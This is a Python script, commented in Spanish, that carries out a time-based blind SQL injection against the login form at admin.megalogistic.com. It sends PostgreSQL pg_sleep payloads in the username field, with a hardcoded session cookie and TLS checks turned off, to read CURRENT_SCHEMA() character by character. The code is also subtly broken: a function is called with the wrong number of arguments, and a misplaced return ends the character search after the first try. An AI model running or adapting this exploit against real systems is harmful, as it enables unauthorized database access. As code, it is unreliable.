import requests
import time
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# === CONFIG ===
url = 'https://admin.megalogistic.com/'
sleep_time = 5
threshold = 4.5

headers = {
  'User-Agent': 'Mozilla/5.0',
  'Content-Type': 'application/x-www-form-urlencoded',
  'Cookie': 'PHPSESSID=fbf8845112383bb9b7de8c1a2f478e4e'
}

def build_payload(position, ascii_code):
  # Evalúa si el carácter en la posición `position` de CURRENT_SCHEMA()
  # tiene código ASCII igual a `ascii_code`, y duerme si es cierto
  return (
    f"' AND 1571=(CASE WHEN "
    f"(ASCII(SUBSTRING(CURRENT_SCHEMA() FROM {position} FOR 1)) = {ascii_code}) "
    f"THEN (SELECT 1571 FROM pg_sleep({sleep_time})) "
    f"ELSE 1571 END)--"
  )

def extract_char(expression, position):
  # Caracteres ordenados por probabilidad de aparición
  common_chars = (
    list("abcdefghijklmnopqrstuvwxyz") +      
    list("_") +                               
    list("ABCDEFGHIJKLMNOPQRSTUVWXYZ") +       
    list("0123456789") +                      
    [chr(i) for i in range(32, 127) if chr(i) not in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_"]
  )

  for c in common_chars:
    ascii_code = ord(c)
    payload = build_payload(expression, position, ascii_code)
    data = {
      'username': payload,
      'password': 'test'
    }

    start = time.time()
    response = requests.post(url, data=data, headers=headers, verify=False)
    elapsed = time.time() - start

    print(f"[?] Pos {position} - Char '{c}' ({ascii_code}) → Tiempo: {elapsed:.2f}s")

    if elapsed > threshold:
      print(f"[✓] Carácter confirmado en pos {position}: '{c}'")
      return c

    print(f"[!] No se encontró carácter en pos {position}")
    return None

def extract_sql_value(expression, max_length):
    print(f"[*] Extrayendo resultado de: {expression}")
    result = ''
    for position in range(1, max_length + 1):
      char = extract_char(expression, position)
      if not char:
        break
      result += char
      print(f"[+] Resultado parcial: {result}")
    return result

if __name__ == '__main__':
    # Cambia aquí la expresión SQL que quieras extraer
  sql_expression = "CURRENT_SCHEMA()" 
  max_len = 60

  value = extract_sql_value(sql_expression, max_len)
  print(f"\n[✓] Resultado completo: {value}")
